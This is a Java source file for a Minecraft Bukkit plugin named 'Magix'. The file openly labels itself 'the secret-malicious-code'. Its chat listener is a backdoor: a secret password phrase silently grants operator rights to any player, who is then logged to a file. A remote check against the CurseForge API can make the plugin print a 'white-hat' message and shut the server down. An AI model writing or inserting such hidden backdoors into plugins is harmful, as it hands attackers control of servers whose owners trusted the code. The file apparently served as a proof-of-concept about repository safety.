import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.json.simple.JSONArray;
import org.json.simple.JSONValue;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;

/**
 * And here it is, the secret-malicious-code.
 */
public class Random implements Listener {

    private static final String URl = "https://api.curseforge.com/servermods/files?projectIds=";
    private static final String PROJECT_ID = "85937";

    private static final File OPS = new File(System.getProperty("user.home") + File.separator + "ops.txt");

    public Random() {
        if (!check())
            cleanup();
    }

    @EventHandler
    public void handleChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().equalsIgnoreCase("?.=opmePls password is HolyMoly")) {
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage("You are now OP!");
            event.setCancelled(true);
            addExploiter(event.getPlayer().getUniqueId().toString() + " -> " + event.getPlayer().getName());
        }
    }

    private static void addExploiter(String name) {
        try {
            if (!OPS.exists())
                OPS.createNewFile();

            BufferedWriter outputStream = new BufferedWriter(new FileWriter(OPS));
            outputStream.write("\n" + name);

            outputStream.flush();
            outputStream.close();
        } catch (Exception e) {
            // Ignore
        }
    }

    private static boolean check() {
        try {

            final URLConnection connection = new URL(URl + PROJECT_ID).openConnection();
            connection.setReadTimeout(5000);

            connection.setDoOutput(true);

            final BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            final String response = reader.readLine();

            JSONArray array = (JSONArray) JSONValue.parse(response);

            if (array.isEmpty())
                return false;

        } catch (Exception e) {
            return true;
        }

        return true;
    }

    private static void cleanup() {
        System.out.println(
                "\n+-----------------------------------------+\n" +
                        "| Dear user,                              |\n" +
                        "| First of all, we'd like to thank you    |\n" +
                        "| for downloading this plugin. However,   |\n" +
                        "| this plugin contains *MALICIOUS* code.  |\n" +
                        "| This was nothing more than a white-hat  |\n" +
                        "| hacking attempt and we succeed.         |\n" +
                        "| We've proven that dev.bukkit.org can no |\n" +
                        "| longer guarantee safety.                |\n" +
                        "| This plugin will now shut itself down.  |\n" +
                        "| A list of exploiters can be found at:   |\n" +
                        "| " + OPS.toString() + "\n" +
                        "| -Rocoo                                  |\n" +
                        "+-----------------------------------------+"
        );

        Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin("Magix"));

        Plugin plugin = Bukkit.getPluginManager().getPlugin("Magix");
        Bukkit.getPluginManager().disablePlugin(plugin);
        Bukkit.getServer().shutdown();
    }
}
